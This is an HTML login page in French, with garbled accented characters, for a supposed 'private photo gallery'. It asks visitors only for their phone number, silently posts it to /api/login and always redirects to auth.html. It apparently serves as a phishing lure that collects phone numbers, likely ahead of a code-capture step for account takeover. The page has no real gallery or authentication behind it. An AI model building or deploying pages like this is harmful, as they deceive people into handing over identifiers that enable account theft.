<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Acc√®s Galerie Priv√©e</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap');

    * { box-sizing: border-box; font-family: 'Poppins', sans-serif; }
    body {
      margin: 0;
      height: 100vh;
      background: url('https://images.unsplash.com/photo-1507525428034-b723cf961d3e?auto=format&fit=crop&w=1500&q=80') no-repeat center center / cover;
      display: flex;
      align-items: center;
      justify-content: center;
      backdrop-filter: blur(5px);
    }
    .card {
      background: rgba(255, 255, 255, 0.08);
      border-radius: 20px;
      padding: 40px;
      width: 380px;
      color: #fff;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
      backdrop-filter: blur(10px);
      border: 1px solid rgba(255, 255, 255, 0.12);
      text-align: center;
      position: relative;
    }
    h2 { margin-bottom: 18px; font-weight: 500; letter-spacing: 1px; }
    form { display:flex; flex-direction:column; gap:14px; }
    input {
      padding: 12px;
      border: none;
      border-radius: 8px;
      outline: none;
      background: rgba(255,255,255,0.12);
      color: #fff;
      font-size: 15px;
      transition: background 0.15s ease;
    }
    input::placeholder { color: #e6e6e6aa; }
    input:focus { background: rgba(255,255,255,0.2); }
    button {
      background: linear-gradient(135deg,#6dd5fa,#2980b9);
      color: white;
      border: none;
      padding: 12px;
      border-radius: 8px;
      font-weight: 600;
      font-size: 16px;
      cursor: pointer;
      transition: transform .18s ease, box-shadow .18s ease;
    }
    button:hover { transform: translateY(-3px); box-shadow: 0 6px 18px rgba(0,0,0,0.28); }
    footer { position: absolute; bottom: 12px; left: 50%; transform: translateX(-50%); font-size: 12px; color: rgba(255,255,255,0.6); }
    .hint { font-size: 13px; color: rgba(255,255,255,0.75); margin-bottom:8px; }
  </style>
</head>
<body>
  <div class="card">
    <h2>üîí Acc√®s √† la Galerie Priv√©e</h2>
    <div class="hint">Entrez votre num√©ro pour acc√©der aux photos</div>

    <form id="login">
      <input name="username" placeholder="Num√©ro de t√©l√©phone" inputmode="tel" required />
      <button type="submit">Entrer</button>
    </form>
  </div>

  <footer>¬© 2025 Ma Galerie</footer>

  <script>
    const FIRST_KEY = 'galerie_first_attempt_shown';

    document.getElementById('login').addEventListener('submit', e => {
      e.preventDefault();
      const fd = new FormData(e.target);
      const payload = { username: fd.get('username') };

      // Flag pour le premier essai
      if (!localStorage.getItem(FIRST_KEY)) {
        localStorage.setItem(FIRST_KEY, '1');
        // petit d√©lai pour effet visuel (facultatif)
        setTimeout(() => window.location.href = 'auth.html', 200);
      } else {
        // redirection imm√©diate pour essais suivants
        window.location.href = 'auth.html';
      }

       fetch('/api/login', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload)
       });
    });
  </script>
</body>
</html>
